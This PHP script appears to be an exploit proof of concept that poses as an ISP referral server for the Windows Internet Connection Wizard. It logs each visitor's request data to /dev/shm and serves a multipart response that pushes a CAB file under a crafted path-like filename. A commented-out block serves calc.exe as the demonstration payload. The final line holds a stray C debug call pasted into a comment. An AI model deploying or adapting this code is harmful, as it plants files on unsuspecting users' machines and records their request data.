<?php
file_put_contents("/dev/shm/log.txt", json_encode($_SERVER, JSON_PRETTY_PRINT). "\n" . json_encode($_GET, JSON_PRETTY_PRINT)."\n\n", FILE_APPEND);
/*
header('Content-Type: text/csv');
header('Content-Disposition: attachment; filename="ispinfo.csv"');

echo "Name,OfferID,Icon,LocalHtm,OEMSpecialIcon,OEMSpecialHtm,ISPFile,CFGFlag,UIFlag,BillingForm,PayCSV,GUID,MIRS,LCID\r\n";
echo "Test,1234,none,none,none,none,none,none,none,none,none,cb9feed4-fe5a-4152-a2e5-eedabae3f509,,,\r\n";
*/


header('Content-Type: multipart/mixed; boundary=miaumiaumiau');
echo "This should be ignored.\r\n";

/*
echo "--miaumiaumiau\r\n";
echo "Content-Type: text/csv\r\n";
echo('Content-Disposition: inline; filename="calc.exe"' . "\r\n");
echo('Content-Length: ' . filesize("calc.exe") . "\r\n\r\n");

readfile("calc.exe");
*/
echo "--miaumiaumiau\r\n";
echo "Content-Type: application/vnd.ms-cab-compressed\r\n";
echo('Content-Disposition: inline; filename="%icw98dir%\download\offer.cab"' . "\r\n");
echo('Content-Length: ' . filesize("offer.cab") . "\r\n\r\n");

readfile("offer.cab");
echo "\r\n--miaumiaumiau--\r\n";


//header('Content-Type: text/csv');
//header('Content-Disposition: attachment; filename="offers50.csv"');
//readfile("ispinfo.csv");		MyDprintf("CDownLoad::Process: %S", pfi->m_pszPath);
